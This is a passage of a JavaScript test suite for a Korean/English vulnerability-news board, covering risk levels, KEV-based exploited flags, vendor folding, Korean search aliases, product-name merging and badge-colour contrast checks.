    'name:perl sql::abstract', 'openwrt:openwrt', 'alpinelinux:alpine_linux', 'microsoft:windows', 'python:python',
    'redhat:keycloak', 'dropbear_ssh_project:dropbear_ssh', 'wordpress:wordpress', 'google:chrome', 'mozilla:firefox',
    'apple:safari', 'linux:linux_kernel', 'synology:diskstation_manager', 'tp-link:archer_c6', 'iptime:firmware',
    'fortinet:fortios', 'paloaltonetworks:pan-os', 'cisco:ios_xe', 'ivanti:connect_secure', 'citrix:netscaler',
    'atlassian:confluence', 'gitlab:gitlab', 'jenkins:jenkins', 'apache:tomcat', 'nginx:nginx', 'php:php', 'nodejs:node.js',
    'oracle:java', 'vmware:esxi', 'zyxel:firmware'];
  const per = LINES.map((line) => ids.filter((id) => productLine(id) === line).length);
  assert.ok(Math.max(...per) <= ids.length / 4, `lines hold ${per}`);
});

test('a Product\'s line follows its id, so Korean and English pages colour it the same', () => {
  const paint = { products: [], summary: { products: ['Microsoft Paint'], platforms: ['Windows'],
    ko: { names: ['Windows 그림판'] }, en: { names: ['Microsoft Paint'] }, devices: ['TP-Link Archer'] } };
  const [ko, en] = ['ko', 'en'].map((lang) => lineKeys(paint, lang));
  assert.equal(ko.get('Windows 그림판'), 'name:paint');
  assert.equal(ko.get('Windows 그림판'), en.get('Microsoft Paint'));
  assert.equal(ko.get('TP-Link Archer'), undefined); // devices have no id: the badge keys by the model name itself
});

// WCAG relative luminance and contrast of two #rrggbb colours.
const lum = (hex) => [1, 3, 5].map((n) => parseInt(hex.slice(n, n + 2), 16) / 255)
  .map((c) => (c <= 0.04045 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4)).reduce((s, c, n) => s + c * [0.2126, 0.7152, 0.0722][n], 0);
const contrast = (a, b) => (Math.max(lum(a), lum(b)) + 0.05) / (Math.min(lum(a), lum(b)) + 0.05);
const hue = (hex) => {
  const [r, g, b] = [1, 3, 5].map((n) => parseInt(hex.slice(n, n + 2), 16) / 255);
  const max = Math.max(r, g, b), d = max - Math.min(r, g, b);
  const h = max === r ? ((g - b) / d) % 6 : max === g ? (b - r) / d + 2 : (r - g) / d + 4;
  return { h: (h * 60 + 360) % 360, s: max ? d / max : 0 };
};

test('every line badge reads at AA and never looks like a risk colour (red, amber, grey)', () => {
  for (const { bg, ink } of LINES) {
    assert.ok(contrast(bg, ink) >= 4.5, `${bg} on ${ink}: ${contrast(bg, ink).toFixed(2)}`);
    const { h, s } = hue(bg);
    assert.ok(h > 60 && h < 330 && s > 0.3, `${bg}: hue ${h.toFixed(0)}, saturation ${s.toFixed(2)}`);
  }
});

// OKLab distance: two line colours closer than this read as the same line at badge size (11-08: #0052a4 vs #2e3a8c).
const oklab = (hex) => {
  const [r, g, b] = [1, 3, 5].map((n) => parseInt(hex.slice(n, n + 2), 16) / 255).map((c) => (c <= 0.04045 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4));
  const [l, m, q] = [[0.4122214708, 0.5363325363, 0.0514459929], [0.2119034982, 0.6806995451, 0.1073969566], [0.0883024619, 0.2817188376, 0.6299787005]]
    .map(([x, y, z]) => Math.cbrt(x * r + y * g + z * b));
  return [0.2104542553 * l + 0.7936177850 * m - 0.0040720468 * q, 1.9779984951 * l - 2.4285922050 * m + 0.4505937099 * q, 0.0259040371 * l + 0.7827717662 * m - 0.8086757660 * q];
};
test('no two line colours are near twins', () => {
  for (const [n, a] of LINES.entries()) {
    for (const b of LINES.slice(n + 1)) {
      const [x, y] = [oklab(a.bg), oklab(b.bg)];
      const gap = Math.hypot(x[0] - y[0], x[1] - y[1], x[2] - y[2]);
      assert.ok(gap >= 0.13, `${a.bg} and ${b.bg} are ${gap.toFixed(3)} apart`);
    }
  }
});

test('a row\'s age is minutes, hours or days ago, and nothing from 30 days on', () => {
  const now = Date.parse('2026-11-08T12:00:00Z');
  assert.deepEqual(relativeAge('2026-11-08T11:59:50Z', now), { value: -1, unit: 'minute' });
  assert.deepEqual(relativeAge('2026-11-08T12:05:00Z', now), { value: -1, unit: 'minute' }); // clock skew
  assert.deepEqual(relativeAge('2026-11-08T11:01:00Z', now), { value: -59, unit: 'minute' });
  assert.deepEqual(relativeAge('2026-11-08T10:00:00Z', now), { value: -2, unit: 'hour' });
  assert.deepEqual(relativeAge('2026-11-07T11:00:00Z', now), { value: -1, unit: 'day' });
  assert.deepEqual(relativeAge('2026-10-10T12:00:01Z', now), { value: -28, unit: 'day' });
  assert.equal(relativeAge('2026-10-09T12:00:00Z', now), null);
});
test('an attack a cited source reports counts as exploited; without the source it does not (critique 14)', () => {
  const told = { exploited: true, exploited_source: 'https://example.com/campaign' };
  const brotli = { ...incident('CVE-2026-7', '2026-11-06T00:00:00Z'), cvss: 7.5, summary: { exploited: true, poc_public: true } };
  assert.equal(isExploited(brotli), false);
  assert.equal(riskLevel(brotli), 'high'); // the level comes from CVSS as usual
  assert.equal(riskLevel({ ...brotli, cvss: undefined }), 'notice');
  assert.equal(isExploited({ ...brotli, summary: { exploited: false, exploited_source: 'https://example.com/x' } }), false);
  assert.deepEqual(exploitReason({ ...brotli, summary: told }), { kind: 'source', url: told.exploited_source });
  assert.deepEqual(exploitReason({ ...brotli, kev: true, kev_date: '2026-11-06', summary: told }), { kind: 'kev', date: '2026-11-06' });
  assert.deepEqual(exploitReason({ ...brotli, kev: true }), { kind: 'kev', date: '' }); // listed before the date was kept
  assert.equal(exploitReason(brotli), null);
});

test('an attack the sources report counts as exploited, as a KEV listing does', () => {
  const campaign = { ...incident('CVE-2026-5', '2026-11-06T00:00:00Z'), cves: [], summary: { exploited: true, exploited_source: 'https://example.com/campaign', products: [], ...Object.fromEntries(['ko', 'en'].map((l) => [l, { title: '', summary: '', conditions: [], mitigation: '' }])) } };
  const quiet = { ...incident('CVE-2026-6', '2026-11-06T00:00:00Z'), cvss: 5 };
  assert.equal(isExploited(campaign), true);
  assert.equal(isExploited({ ...quiet, kev: true }), true);
  assert.equal(isExploited(quiet), false);
  assert.equal(riskLevel(campaign), 'highest');
  assert.deepEqual(filterBoard([campaign, quiet], [], '', Date.parse('2026-11-07T00:00:00Z'), { kev: true }).list.map((i) => i.id), [campaign.id]);
  // A CVE-less story with few HN points is no Highlight, unless its sources report attacks.
  assert.deepEqual(filterBoard([campaign], [], '', Date.parse('2026-11-07T00:00:00Z')).highlights.map((i) => i.id), [campaign.id]);
});

test('an Easy headline that leaves out the product gets the row\'s first Product in front (critique 14)', () => {
  assert.equal(namedHeadline('서버 멈춤 위험', ['Brotli', 'Google Brotli']), 'Brotli: 서버 멈춤 위험');
  assert.equal(namedHeadline('Brotli 압축기 서버 멈춤 위험', ['Google Brotli']), 'Brotli 압축기 서버 멈춤 위험'); // a word of the name is enough
  assert.equal(namedHeadline('SonicWall VPN 장비 뚫림 위험', ['SonicWall SonicOS']), 'SonicWall VPN 장비 뚫림 위험');
  assert.equal(namedHeadline('Windows 그림판 해킹 위험', ['Windows 그림판', 'Microsoft Paint']), 'Windows 그림판 해킹 위험');
  assert.equal(namedHeadline('그림판 해킹 위험', ['Windows 그림판', 'Microsoft Paint']), '그림판 해킹 위험'); // its Korean name
  assert.equal(namedHeadline('Paint can be hacked', ['Microsoft Paint']), 'Paint can be hacked');
  // "WordPress" or "plugin" alone does not name the plugin.
  assert.equal(namedHeadline('워드프레스 플러그인 해킹 위험', ['WP Duplicate WordPress plugin']), 'WP Duplicate WordPress plugin: 워드프레스 플러그인 해킹 위험');
  assert.equal(namedHeadline('Home routers open to anyone', []), 'Home routers open to anyone'); // no Product: as it is
});

test('a library, SDK or framework gets the "ask your app or host" version help; apps and devices do not', () => {
  const s = (products, extra = {}) => ({ summary: { products, devices: [], en: { title: '' }, ...extra } });
  assert.equal(isLibrary(s(['Google Brotli'], { library: true })), true); // the Summary says so
  assert.equal(isLibrary(s(['Qt Framework'])), true);
  assert.equal(isLibrary(s(['IBM Qiskit SDK'])), true);
  assert.equal(isLibrary(s(['Perl SQL::Abstract'])), true);
  assert.equal(isLibrary(s(['RRD::CGI::Image'])), true);
  assert.equal(isLibrary(s(['OpenSSH'])), false);
  assert.equal(isLibrary(s(['Storage TS4500 Library'], { devices: ['IBM TS4500'] })), false); // a tape library is a device
  assert.equal(isLibrary({ products: [{ id: 'zlib:zlib', name: 'zlib library' }] }), true); // no Summary yet: NVD's name
});

test('operating systems lead the tags of a row', () => {
  const lib = { summary: { products: ['CPython'], platforms: ['Windows', 'Linux'], devices: [] } };
  assert.deepEqual(rowTags(lib, 'en'), ['Windows', 'Linux', 'CPython']);
});

test('a Product that is also an operating system shows once, as the OS badge', () => {
  const campaign = { summary: { products: ['iOS', 'Android'], platforms: ['iOS', 'Android'], devices: [],
    ko: { names: ['iOS', '안드로이드'] }, en: { names: ['iOS', 'Android'] } } };
  assert.deepEqual(rowTags(campaign, 'ko'), ['Android', 'iOS']);
  assert.deepEqual(rowTags(campaign, 'en'), ['Android', 'iOS']);
});

test('one sort orders both groups: newest first, or by risk, or by score', () => {
  const a = { ...incident('CVE-2026-1', '2026-11-01T00:00:00Z'), cvss: 9.8 };
  const b = { ...incident('CVE-2026-2', '2026-11-03T00:00:00Z'), cvss: 5 };
  const c = { ...incident('CVE-2026-3', '2026-11-02T00:00:00Z'), cvss: 7.5 };
  const ids = (sort) => [a, b, c].sort(orderBy(sort)).map((i) => i.id);
  assert.deepEqual(ids('new'), ['CVE-2026-2', 'CVE-2026-3', 'CVE-2026-1']);
  assert.deepEqual(ids('risk'), ['CVE-2026-1', 'CVE-2026-3', 'CVE-2026-2']);
  assert.deepEqual(ids('cvss'), ['CVE-2026-1', 'CVE-2026-3', 'CVE-2026-2']);
});

test('a Latin display name that is not the product name falls back to it, so one Product reads one way', () => {
  const axis = { summary: { products: ['Apache Axis2/Java'], platforms: [], devices: [], ko: { names: ['Apache Axis2'] }, en: { names: ['Apache Axis2'] } } };
  assert.deepEqual(rowTags(axis, 'ko'), ['Apache Axis2/Java']);
  const paint = { summary: { products: ['Microsoft Paint'], platforms: [], devices: [], ko: { names: ['Windows 그림판'] } } };
  assert.deepEqual(rowTags(paint, 'ko'), ['Windows 그림판']); // a Korean name stays
});

test("one vendor's bulk push folds into one list item from five rows of a day, at the first row's place (user, 2026-11-09)", () => {
  const ibm = (n, day = '2026-11-08') => ({ id: `CVE-2026-${n}`, cves: [`CVE-2026-${n}`], first_seen: `${day}T17:00:00Z`, published: `${day}T16:0${n % 10}:00Z`,
    products: [{ id: `ibm:product_${n}`, name: `Product ${n}` }], mentions: [], brief: { text: '' } });
  const other = { id: 'CVE-2026-900', cves: ['CVE-2026-900'], first_seen: '2026-11-08T17:00:00Z', published: '2026-11-08T16:30:00Z',
    products: [{ id: 'openbsd:openssh', name: 'OpenSSH' }], mentions: [], brief: { text: '' } };
  const rows = [ibm(1), other, ibm(2), ibm(3), ibm(4), ibm(5), ibm(6, '2026-11-07')];
  const items = foldByVendor(rows, 5);
  assert.equal(items.length, 3);
  assert.deepEqual(items[0].incidents.map((i) => i.id), ['CVE-2026-1', 'CVE-2026-2', 'CVE-2026-3', 'CVE-2026-4', 'CVE-2026-5']);
  assert.equal(items[0].vendor, 'ibm');
  assert.equal(items[1], other);
  assert.equal(items[2].id, 'CVE-2026-6'); // another day stays a row
  assert.equal(foldByVendor(rows, 6).length, rows.length); // below the minimum nothing folds
  assert.equal(foldByVendor(rows, 0).length, rows.length); // 0 turns the fold off
});

test('WordPress plugins and themes of a day fold like one vendor, ahead of their own vendor (owner, critique 14 c.1)', () => {
  const at = (n) => ({ cves: [`CVE-2026-${n}`], first_seen: '2026-11-08T17:00:00Z', published: `2026-11-08T1${n % 10}:00:00Z`, mentions: [] });
  const wp = [
    { id: 'w1', ...at(1), brief: { text: 'The Turisbook Booking System WordPress plugin through 1.3.8 does not check' } },
    { id: 'w2', ...at(2), brief: { text: 'The JetFormBuilder plugin for WordPress is vulnerable to XSS' } },
    { id: 'w3', ...at(3), brief: { text: 'XSS in Welcart' }, summary: { ko: { title: 'Welcart XSS', summary: '워드프레스 쇼핑몰 플러그인 Welcart의 XSS입니다.' } } },
    { id: 'w4', ...at(4), brief: { text: 'Stored XSS' }, summary: { en: { title: 'WordPress FV Flowplayer plugin stored XSS' } } },
    // an IBM row that is a WordPress plugin joins the WordPress fold, not IBM's
    { id: 'w5', ...at(5), brief: { text: 'An IBM theme for WordPress leaks data' }, products: [{ id: 'ibm:wp_theme', name: 'WP Theme' }] },
  ];
  const ibm = [6, 7, 8, 9].map((n) => ({ id: `i${n}`, ...at(n), brief: { text: 'IBM notice' }, products: [{ id: `ibm:p${n}`, name: `P${n}` }] }));
  const core = { id: 'c', ...at(0), brief: { text: 'Brotli reaches stock WordPress through pingbacks' } }; // not a plugin
  const items = foldByVendor([...wp, core, ...ibm], 5);
  assert.equal(items[0].vendor, 'wordpress');
  assert.deepEqual(items[0].incidents.map((i) => i.id), ['w1', 'w2', 'w3', 'w4', 'w5']);
  assert.deepEqual(items.slice(1).map((i) => i.id), ['c', 'i6', 'i7', 'i8', 'i9']); // IBM keeps four: below five, no fold
  const itself = { id: 'x', ...at(0), brief: { text: 'WordPress before 6.4 lets a plugin upload files' }, summary: { products: ['WordPress'] } };
  assert.equal(foldByVendor([itself, ...wp.slice(0, 4)], 5).length, 5); // WordPress itself is not a plugin
  assert.deepEqual(['JWT Auth 워드프레스 플러그인', 'Confection WordPress plugin', 'Hello theme for WordPress', 'WPForms'].map(pluginName),
    ['JWT Auth', 'Confection', 'Hello', 'WPForms']); // the fold's line names plugins without repeating "plugin"
});

test('search understands the Korean words people use for systems and devices (윈도우, 공유기)', () => {
  const win = { ...incident('CVE-2026-11', '2026-11-08T00:00:00Z'), products: [{ id: 'microsoft:windows_11', name: 'Microsoft Windows 11' }] };
  const router = { ...incident('CVE-2026-12', '2026-11-08T00:00:00Z'), products: [{ id: 'tp-link:archer_router', name: 'Archer Router' }] };
  const ids = (q) => filterBoard([win, router], [], q, NOW).list.map((i) => i.id);
  assert.deepEqual(ids('윈도우'), [win.id]);
  assert.deepEqual(ids('공유기'), [router.id]);
  assert.deepEqual(ids('리눅스'), []);
});

// critique 13: 자바 found javascript, 엣지 found "knowledge", 아이폰 found "scenarios" (substrings of free text).
test('a Korean search word matches its English names only in Product names, ids and OS tags, as whole words', () => {
  const at = (id, extra) => ({ ...incident(id, '2026-11-08T00:00:00Z'), ...extra });
  const java = at('CVE-2026-21', { products: [{ id: 'oracle:java_se', name: 'Java SE' }] });
  const js = at('CVE-2026-22', { brief: { text: 'XSS in a JavaScript widget; Java not involved', lead: '' }, products: [{ id: 'acme:javascript_widget', name: 'Javascript Widget' }] });
  const edge = at('CVE-2026-23', { products: [{ id: 'microsoft:edge_chromium', name: 'Edge Chromium' }] });
  const kb = at('CVE-2026-24', { brief: { text: 'Knowledge base plugin leaks posts', lead: '' } });
  const ios = at('CVE-2026-25', { summary: { products: ['Safari'], platforms: ['iOS'], devices: [], ...Object.fromEntries(['ko', 'en'].map((l) => [l, { title: '', summary: '', conditions: [], mitigation: '' }])) } });
  const scenarios = at('CVE-2026-26', { brief: { text: 'Attack scenarios for routers', lead: '' } });
  const korean = at('CVE-2026-27', { brief: { text: '자바 애플릿 문제', lead: '' } });
  const ids = (q) => filterBoard([java, js, edge, kb, ios, scenarios, korean], [], q, NOW).list.map((i) => i.id).sort();
  assert.deepEqual(ids('자바'), [java.id, korean.id]); // the typed word itself still matches free text
  assert.deepEqual(ids('엣지'), [edge.id]);
  assert.deepEqual(ids('아이폰'), [ios.id]);
  assert.deepEqual(ids('공유기'), []); // "routers" in a description is not a Product
});

test('the alias hint names each Korean word used and what it was also searched as', () => {
  assert.deepEqual(aliasesUsed('맥 openssh'), [{ word: '맥', names: ['macOS'] }]);
  assert.deepEqual(aliasesUsed('아이폰'), [{ word: '아이폰', names: ['iOS', 'iPhone'] }]);
  assert.deepEqual(aliasesUsed('openssh'), []);
});

// critique 13: 43% of rows have no score yet; sorting them last read as "lowest risk".
test('rows with no score yet sort above scored 참고 rows, below 위험, by risk and by CVSS', () => {
  const at = (n, cvss, extra = {}) => ({ ...incident(`CVE-2026-${n}`, `2026-11-0${n}T00:00:00Z`), cvss, ...extra });
  const top = at(1, 9.8);
  const high = at(2, 7.5);
  const low = at(3, 5);
  const none = at(4, undefined);
  const nullScore = at(5, null);
  const exploited = at(6, undefined, { kev: true });
  const ids = (sort) => [low, none, high, top, nullScore, exploited].sort(orderBy(sort)).map((i) => i.id);
  assert.deepEqual(ids('risk'), ['CVE-2026-6', 'CVE-2026-1', 'CVE-2026-2', 'CVE-2026-5', 'CVE-2026-4', 'CVE-2026-3']);
  assert.deepEqual(ids('cvss'), ['CVE-2026-1', 'CVE-2026-2', 'CVE-2026-6', 'CVE-2026-5', 'CVE-2026-4', 'CVE-2026-3']);
});

// critique 13: IBM's NVD names ("Storage Scale") lost their vendor on badges and in fold lines.
test("a Product name from NVD or the CVE record gets its known vendor in front when it lacks it", () => {
  const tags = (products) => rowTags({ products });
  assert.deepEqual(tags([{ id: 'ibm:storage_scale', name: 'Storage Scale' }]), ['IBM Storage Scale']);
  assert.deepEqual(tags([{ id: 'ibm:qradar', name: 'IBM QRadar' }]), ['IBM QRadar']);
  assert.deepEqual(tags([{ id: 'getgrav:grav', name: 'grav' }]), ['grav']); // an unknown vendor is left alone
  // a Summary's own names are vendor-led already and stay as written
  assert.deepEqual(rowTags({ products: [{ id: 'ibm:qiskit_sdk', name: 'Qiskit Sdk' }], summary: { products: ['Qiskit SDK'], devices: [] } }), ['Qiskit SDK']);
  assert.deepEqual([vendorName('ibm'), vendorName('sonicwall'), vendorName('acme')], ['IBM', 'SonicWall', 'ACME']);
});

// Owner, 11-09: vendors are added in one file (web/vendors.json) that the collector reads too, never in code.
test('vendor spellings come from web/vendors.json', () => {
  const file = JSON.parse(readFileSync(new URL('../web/vendors.json', import.meta.url), 'utf8'));
  for (const [key, name] of Object.entries(file)) assert.equal(vendorName(key), name);
  const [key] = Object.keys(file);
  assert.deepEqual(rowTags({ products: [{ id: `${key}:thing`, name: 'Thing' }] }), [`${file[key]} Thing`]);
});

// critique 13: the mint line was 0.05 from the dark Clear Green; a Product badge must never read as "all clear".
test('no line colour is a near twin of Clear Green (--ok) in either theme', () => {
  const ok = readFileSync(new URL('../web/index.html', import.meta.url), 'utf8').match(/--ok: light-dark\((#\w{6}), (#\w{6})\)/).slice(1);
  for (const { bg } of LINES) {
    for (const green of ok) {
      const [x, y] = [oklab(bg), oklab(green)];
      const gap = Math.hypot(x[0] - y[0], x[1] - y[1], x[2] - y[2]);
      assert.ok(gap >= 0.13, `${bg} and --ok ${green} are ${gap.toFixed(3)} apart`);
    }
  }
});

// Critique 14: "GemBooking" and "GemBooking WordPress plugin" were two Products (picking one hid the other), SevOne had a
// Korean and an English name, Chengdu Feiyuxing came with and without "(Technology)".
const fullSummary = (products) => ({ products, platforms: [], devices: [],
  ...Object.fromEntries(['ko', 'en'].map((l) => [l, { title: '', summary: '', conditions: [], mitigation: '' }])) });

test('name variants of one Product share its id: generic suffixes, letter case, company words and a known vendor drop out', () => {
  const ids = (name) => productsOf({ summary: { products: [name] } }).map((p) => p.id);
  assert.deepEqual(ids('GemBooking WordPress plugin'), ['name:gembooking']);
  assert.deepEqual(ids('GemBooking'), ['name:gembooking']);
  assert.deepEqual(ids('gembooking plugin'), ['name:gembooking']);
  assert.deepEqual(ids('Starter Theme'), ['name:starter']);
  assert.deepEqual(ids('예약 플러그인'), ['name:예약']);
  assert.deepEqual(ids('IBM SevOne Network Performance Management'), ids('SevOne Network Performance Management'));
  assert.deepEqual(ids('Chengdu Feiyuxing (Technology) VW2100'), ids('Chengdu Feiyuxing VW2100'));
  assert.deepEqual(ids('Theme'), ['name:theme']); // nothing would be left: the name stays
});

test('a picked Product also finds Incidents filed under a variant of its name, and counts them', () => {
  const at = (id, extra) => ({ ...incident(id, '2026-11-07T00:00:00Z'), ...extra });
  const plugin = at('CVE-2026-31', { summary: fullSummary(['GemBooking WordPress plugin']) });
  const nvd = at('CVE-2026-32', { products: [{ id: 'gemcode:gembooking', name: 'Gembooking' }] });
  const paint = at('CVE-2026-33', { summary: fullSummary(['Microsoft Paint']) });
  const iptime = at('CVE-2026-34', { products: [{ id: 'iptime:firmware', name: 'Firmware' }] });
  const tplink = at('CVE-2026-35', { products: [{ id: 'tp-link:firmware', name: 'Firmware' }] });
  const all = [plugin, nvd, paint, iptime, tplink];
  const pick = (...picks) => { const r = filterBoard(all, picks, '', NOW); return [r.list.map((i) => i.id).sort(), r.variants]; };
  assert.deepEqual(pick('name:gembooking'), [[plugin.id, nvd.id], 1]); // the NVD-named one is the variant
  assert.deepEqual(pick('name:gembooking wordpress plugin'), [[plugin.id, nvd.id], 2]); // an old saved pick
  assert.deepEqual(pick('name:microsoft paint'), [[paint.id], 1]);
  assert.deepEqual(pick('iptime:firmware'), [[iptime.id], 0]); // two vendors' "Firmware" are not one Product
  assert.deepEqual(pick('os:windows'), [[], 0]);
});

test('a saved or shared pick of an old variant id reads back as the Product it now belongs to', () => {
  assert.deepEqual(filterFromQuery('p=name%3Agembooking+wordpress+plugin&p=os%3Awindows').picks, ['name:gembooking', 'os:windows']);
});

test('the picker lists an old variant id from products.json once, under the Product it now belongs to', () => {
  const seen = [{ id: 'name:gembooking wordpress plugin', ko: 'GemBooking', en: 'GemBooking' }];
  const i = { ...incident('CVE-2026-36', '2026-11-07T00:00:00Z'), summary: { products: ['GemBooking'] } };
  assert.deepEqual(productList([i], new Date('2026-11-07T12:00:00Z'), 'en', seen).map((p) => p.id), ['name:gembooking']);
});

test('Korean names of common vendors and projects find them (critique 14: 아파치 and 깃허브 found nothing)', () => {
  const at = (id, product) => ({ ...incident(id, '2026-11-08T00:00:00Z'), products: [product] });
  const apache = at('CVE-2026-41', { id: 'apache:http_server', name: 'Http Server' });
  const github = at('CVE-2026-42', { id: 'github:enterprise_server', name: 'Enterprise Server' });
  const node = at('CVE-2026-43', { id: 'nodejs:node.js', name: 'Node.js' });
  const ids = (q) => filterBoard([apache, github, node], [], q, NOW).list.map((i) => i.id);
  assert.deepEqual([ids('아파치'), ids('깃허브'), ids('노드')], [[apache.id], [github.id], [node.id]]);
  for (const word of ['깃랩', '도커', '쿠버네티스', '엔진엑스', '톰캣', '리액트', '스프링', '시스코', '포티넷', '마이크로소프트', '구글', '애플', '워드프레스']) {
    assert.ok(SEARCH_ALIASES[word]?.length, word);
  }
});

test('자바 and java never find JavaScript, in either language (critique 14: 자바스크립트 in Korean Summaries)', () => {
  const at = (id, text) => ({ ...incident(id, '2026-11-08T00:00:00Z'), brief: { text, lead: '' } });
  const koJs = at('CVE-2026-51', '로그인 사용자가 자바스크립트를 저장할 수 있습니다');
  const enJs = at('CVE-2026-52', 'Stored JavaScript in a widget');
  const koJava = at('CVE-2026-53', '자바 입력 검사 도구 문제');
  const enJava = at('CVE-2026-54', 'A Java input checker flaw');
  const ids = (q) => filterBoard([koJs, enJs, koJava, enJava], [], q, NOW).list.map((i) => i.id).sort();
  assert.deepEqual(ids('자바'), [koJava.id]);
  assert.deepEqual(ids('java'), [enJava.id]);
  assert.deepEqual(ids('자바스크립트'), [koJs.id]); // asked for by name, it is found
});

test('a vendor fold member names its vendor in the title (critique 14: Langflow OSS inside the IBM fold)', () => {
  assert.equal(vendorLedTitle('Langflow OSS file access bypass', 'IBM', 'IBM Langflow OSS'), 'IBM Langflow OSS file access bypass');
  assert.equal(vendorLedTitle('Langflow OSS 파일 접근 우회', 'IBM', 'Langflow OSS'), 'IBM Langflow OSS 파일 접근 우회');
  assert.equal(vendorLedTitle('IBM QRadar flaw', 'IBM', 'IBM QRadar'), 'IBM QRadar flaw');
  assert.equal(vendorLedTitle('Files readable without a login', 'IBM', 'IBM Langflow OSS'), 'IBM Langflow OSS: Files readable without a login');
  assert.equal(vendorLedTitle('Db2 서버 멈춤', 'IBM', 'IBM Db2 for Linux'), 'IBM Db2 서버 멈춤');
});

// The collector's feed and sitemap lists use a Python port of these rules (collector.incidents.risk_level, search_worthy).
test("the collector's risk rule and search-worthy rule match the page's", () => {
  const kase = JSON.parse(readFileSync(new URL('./fixtures/board/risk-case.json', import.meta.url), 'utf8'));
  for (const c of kase.cases) {
    assert.equal(riskLevel(c.incident), c.risk, c.incident.id);
    assert.equal(searchWorthy(c.incident), c.search_worthy, c.incident.id);
  }
});

// Owner, 11-10: the Board draws first from board/rows.json, whose row views lack the details and the search text. The
// collector's rows_view, highlight_score and is_wordpress_plugin are checked on the same cases in tests/test_products.py.
test('a row view of board/rows.json draws, filters, folds and pins as its full Incident does', () => {
  const kase = JSON.parse(readFileSync(new URL('./fixtures/board/rows-case.json', import.meta.url), 'utf8'));
  const now = Date.parse(kase.now);
  const full = kase.cases.map((c) => c.full);
  const rows = kase.cases.map((c) => c.row);
  for (const c of kase.cases) {
    assert.equal(highlightScore(c.full), c.highlight_score, c.full.id);
    assert.equal(isWordPressPlugin(c.full), c.wp_plugin, c.full.id);
    for (const rule of [riskLevel, pinReason, publishedAt, isWordPressPlugin, isExploited, onBoard, briefMarker, highlightScore]) {
      assert.deepEqual(rule(c.row), rule(c.full), `${rule.name} ${c.full.id}`);
    }
    for (const lang of ['ko', 'en']) assert.deepEqual([rowTags(c.row, lang), productsOf(c.row, lang)], [rowTags(c.full, lang), productsOf(c.full, lang)]);
  }
  const ids = (list) => list.map((i) => i.id);
  const shape = (out) => out.map((x) => (x.fold ? [x.fold, ids(x.incidents)] : x.id));
  for (const [picks, opts] of [[[], {}], [[], { sort: 'risk' }], [[], { sort: 'cvss' }], [[], { risk: ['highest'] }], [[], { kev: true }],
    [[], { cvssMin: 7 }], [[], { cve: 'no' }], [[], { has: ['advisory'] }], [['os:windows'], {}], [['name:gembooking'], {}]]) {
    const [a, b] = [filterBoard(full, picks, '', now, opts), filterBoard(rows, picks, '', now, opts)];
    assert.deepEqual([ids(b.highlights), ids(b.list), b.variants], [ids(a.highlights), ids(a.list), a.variants], JSON.stringify([picks, opts]));
    assert.deepEqual(shape(foldByVendor(b.list)), shape(foldByVendor(a.list)));
  }
  // CVE-2026-9003's row view has no text that says "theme for WordPress": the collector's answer keeps it in the fold.
  assert.deepEqual(shape(foldByVendor(filterBoard(rows, [], '', now).list)).find(Array.isArray), ['wordpress 2026-11-08', ['CVE-2026-9003', 'CVE-2026-9002', 'CVE-2026-9001']]);
});

test('a row view replaces a held full Incident only when what its row shows changed; full Incidents replace as before', () => {
  const fullOne = { id: 'CVE-2026-1', cves: ['CVE-2026-1'], published: '2026-11-08T01:00:00Z', cvss: 7.5,
    products: [{ id: 'ibm:db2', name: 'Db2' }], mentions: [{ kind: 'advisory', url: 'https://a', title: 'A' }],
    summary: { at: '2026-11-08T02:00:00Z', ko: { summary: 'whole' } } };
  const row = { id: 'CVE-2026-1', rows: true, cves: ['CVE-2026-1'], published: '2026-11-08T01:00:00Z', cvss: 7.5,
    products: [{ id: 'ibm:db2', name: 'Db2' }], mentions: [{ kind: 'advisory' }], summary: { at: '2026-11-08T02:00:00Z', ko: { summary: '' } } };
  assert.equal(mergeIncidents([fullOne], [row]).incidents[0], fullOne); // unchanged: the details are still right
  for (const changed of [{ ...row, kev: true }, { ...row, summary: { ...row.summary, at: '2026-11-09T00:00:00Z' } },
    { ...row, mentions: [...row.mentions, { kind: 'discussion', points: 120 }] },
    { ...row, mentions: [{ kind: 'advisory', points: 150 }] }, // HN buzz: pinReason and highlightScore read the points
    { ...row, quick_title: { ko: { title: '새 제목' }, en: { title: 'New title' } } }]) {
    assert.equal(mergeIncidents([fullOne], [changed]).incidents[0], changed); // owner, 11-10: a new KEV, Summary or Mention shows
  }
  assert.equal(mergeIncidents([row], [fullOne]).incidents[0], fullOne);
  const fresher = { ...fullOne, cvss: 9.8 };
  assert.equal(mergeIncidents([fullOne], [fresher]).incidents[0], fresher);
  const newer = { ...row, cvss: 9 };
  assert.equal(mergeIncidents([row], [newer]).incidents[0], newer);
  assert.deepEqual(mergeIncidents([fullOne], [{ id: 'CVE-2026-2', rows: true }]).added, ['CVE-2026-2']);
});

// Owner, 11-10: the full week (board/recent.json) is the truth for row views. One it does not hold left the week or was
// merged into another Incident since the page loaded; a reload would not show it either, and nothing could fill it.
test('the full week replaces row views and drops the row views it does not hold; full Incidents beyond it stay', () => {
  const row = (id) => ({ id, rows: true, cves: [id], mentions: [] });
  const whole = (id) => ({ id, cves: [id], mentions: [{ kind: 'advisory', url: 'https://a' }] });
  const older = whole('CVE-2026-9'); // loaded by 이전 사건 불러오기
  const { incidents, added } = mergeIncidents([row('CVE-2026-1'), row('CVE-2026-2'), older], [whole('CVE-2026-1'), whole('CVE-2026-3')], true);
  assert.deepEqual(incidents.map((i) => [i.id, Boolean(i.rows)]), [['CVE-2026-1', false], ['CVE-2026-9', false], ['CVE-2026-3', false]]);
  assert.deepEqual(added, ['CVE-2026-3']);
  // rows.json is not the whole truth: a row view it lacks stays until the full week says otherwise
  assert.deepEqual(mergeIncidents([row('CVE-2026-2')], [row('CVE-2026-1')]).incidents.map((i) => i.id), ['CVE-2026-2', 'CVE-2026-1']);
});

// "Copy this Incident's link" (ticket incident-pages/03): the Incident page in the visitor's language when the Incident
// has one (a Summary, on the Board, first seen within 90 days, as edge/page.mjs decides), else the Board's #i= link.
test("the copy button gives the Incident page in the visitor's language, and the Board link when there is no page", async () => {
  const now = Date.parse('2026-11-10T00:00:00Z');
  const board = 'https://patchticker.com/';
  const cve = { id: 'CVE-2026-123158', cves: ['CVE-2026-123158'], first_seen: '2026-11-06T00:46:00Z', summary: { ko: {}, en: {} } };
  const s = await slug(cve.id);
  assert.equal(shareLink(cve, s, 'ko', board, now), 'https://patchticker.com/i/CVE-2026-123158');
